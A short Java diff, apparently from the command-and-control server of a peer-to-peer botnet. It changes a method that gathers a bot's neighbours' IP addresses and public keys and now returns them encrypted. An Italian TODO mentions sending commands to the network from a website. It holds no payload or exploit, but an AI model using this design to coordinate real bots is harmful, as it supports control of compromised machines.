@@ -192,8 +192,15 @@ public class Commando {
 	/**
 	 * @param data
 	 * @return
+	 * @throws BadPaddingException 
+	 * @throws IllegalBlockSizeException 
+	 * @throws InvalidAlgorithmParameterException 
+	 * @throws UnsupportedEncodingException 
+	 * @throws NoSuchPaddingException 
+	 * @throws NoSuchAlgorithmException 
+	 * @throws InvalidKeyException 
 	 */
-	public SyncIpList<IP, PublicKey> getNeighbours(String data) {
+	public ArrayList<String> getNeighbours(String data) throws InvalidKeyException, NoSuchAlgorithmException, NoSuchPaddingException, UnsupportedEncodingException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException {
 		String idBot;
 		Bot bot = null;
 		try {
@@ -222,7 +229,7 @@ public class Commando {
 		DefaultEdge[] a = new DefaultEdge[setEd.size()];
 		setEd.toArray(a);
 
-		SyncIpList<IP, PublicKey> ipN = new SyncIpList<IP, PublicKey>();
+		ArrayList<Object> ipN = new ArrayList<Object>();
 		for (int i = 0; i < a.length; i++) {
 
 			IP s = graph.getEdgeSource(a[i]);
@@ -236,8 +243,9 @@ public class Commando {
 				Bot tB = bServ.searchBotIP(t);
 				ipN.add(new Pairs<IP, PublicKey>(new IP(tB.getIp()), tB.getPubKey()));
 			}
-		}
-		return ipN;
+		}		
+
+		return pki.getCrypto().encodeObjs(ipN);
 	}
 
 	// TODO inserire metodi che inviano i comandi alla rete a comando dal sito
